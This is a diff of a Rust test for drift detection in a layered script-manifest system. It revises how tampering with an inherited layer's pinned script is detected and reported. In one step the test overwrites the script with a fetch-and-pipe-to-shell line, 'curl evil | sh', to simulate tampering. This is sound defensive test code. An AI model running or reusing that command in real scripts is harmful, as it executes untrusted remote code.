@@ -868,11 +868,10 @@ fn inherited_seats_resolve_their_paths_against_the_layer_that_wrote_them() {
 /// Decision 0046 ruling 4 (design DD9): an inherited exec seat with hands
 /// is judged, under `harness`, against the layer that WROTE it — the
 /// pinned-script lookup runs over the ancestor's directory, which is the
-/// one the seat's `./` expands against — and at spawn the same layer is
-/// re-walked: the ancestor's compose digest is re-derived by the same
-/// `manifest_for` call, and when its script moved the drift names the
-/// ancestor and its `@compose/` key, while the leaf, untouched, names
-/// nothing.
+/// one the seat's `./` expands against. At spawn its script directory is
+/// checked against the file map retained from the ancestor's compose
+/// manifest (proposed 0048); drift names the ancestor and the script key,
+/// while unrelated source edits and the leaf name nothing.
 #[test]
 fn an_inherited_seats_ancestor_is_re_derived_by_the_re_walk() {
     let library = Library::new();
@@ -916,19 +915,19 @@ fn an_inherited_seats_ancestor_is_re_derived_by_the_re_walk() {
     assert_eq!(bundle.manifest["boundary"], json!({"work": "harness"}));
 
     // Untouched, both layers name nothing.
-    assert_eq!(layer_drift(&bundle, &base), None);
+    assert_eq!(layer_drift(&bundle, &base.join("scripts")), None);
     assert_eq!(layer_drift(&bundle, &leaf), None);
 
-    // The ancestor's script moved: its compose digest re-derives
-    // differently, and the drift names the ancestor by its layer name and
-    // the key its digest rides under; the leaf still names nothing.
+    // The inherited layer may also be a realm with implementation files.
+    std::fs::write(base.join("source.rs"), "implementation changed\n").unwrap();
+    assert_eq!(layer_drift(&bundle, &base.join("scripts")), None);
+
+    // The ancestor's script moved: its retained compose file map names
+    // the changed script; the leaf still names nothing.
     std::fs::write(&script, "#!/bin/sh\ncurl evil | sh\n").unwrap();
     assert_eq!(
-        layer_drift(&bundle, &base),
-        Some((
-            "base".to_string(),
-            "changed: @compose/0000/base".to_string()
-        ))
+        layer_drift(&bundle, &base.join("scripts")),
+        Some(("base".to_string(), "changed: scripts/verify.sh".to_string()))
     );
     assert_eq!(layer_drift(&bundle, &leaf), None);
 
